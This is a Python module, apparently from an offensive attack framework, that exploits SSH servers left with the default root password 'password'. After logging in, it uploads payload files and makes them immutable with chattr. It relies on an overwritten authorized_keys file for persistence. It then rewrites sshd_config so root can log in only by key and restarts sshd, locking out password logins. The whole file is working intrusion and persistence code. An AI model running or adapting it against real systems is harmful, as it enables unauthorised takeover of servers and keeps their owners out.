#!/usr/bin/python3

from .base import Module
import socket
import time
from pwnlib.tubes.ssh import ssh
from ..payloads.basicpayload import BasicPayload

class SSHDefaultPassword(Module):
    """Exploits the ssh default passwords (Primary Module)"""

    payload = BasicPayload() # No payload required

    def detect(self, target):
        """Try to connect with the default credentials"""
        try:
            s = ssh(host=target['ip'], user="root", password="password",
                    timeout=0.25)
            return s
        except:
            print("Default creds not working (%s)" % target)
            return None

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # detect_val should be ssh shell we used to test for compromise
        # Saves an open socket

        try:
            for i in self.payload.files.keys():
                detect_val.shell("chattr -i %s" % self.payload.files[i])
                try:
                    detect_val.upload_file(i, self.payload.files[i])
                except:
                    print("Unable to upload %s to %s" % (i,
                                                         self.payload.files[i])
                          )
                detect_val.shell("chattr +i %s" % self.payload.files[i])
            for i in self.payload.steps():
                detect_val.shell(i)

            # Fix the problem after persistence
            # We are relying on the hope that we overwrote the authorized_keys
            # with our own
            detect_val.shell("chattr -i /etc/ssh/sshd_config")
            detect_val.shell("sed -i 's/#PermitRootLogin yes/PermitRootLogin "
                             "without-password/g' /etc/ssh/sshd_config")
            detect_val.shell("sed -i 's/PermitRootLogin yes/PermitRootLogin "
                             "without-password/g' /etc/ssh/sshd_config")
            detect_val.shell("sed -i 's/#PermitRootLogin without-password/"
                             "PermitRootLogin without-password/g' /etc/ssh"
                             "/sshd_config")
            detect_val.shell("chattr +i /etc/ssh/sshd_config")
            detect_val.shell("service sshd restart")
            time.sleep(0.25)

            detect_val.close()
        except:
            import traceback
            traceback.print_exc()

        return True

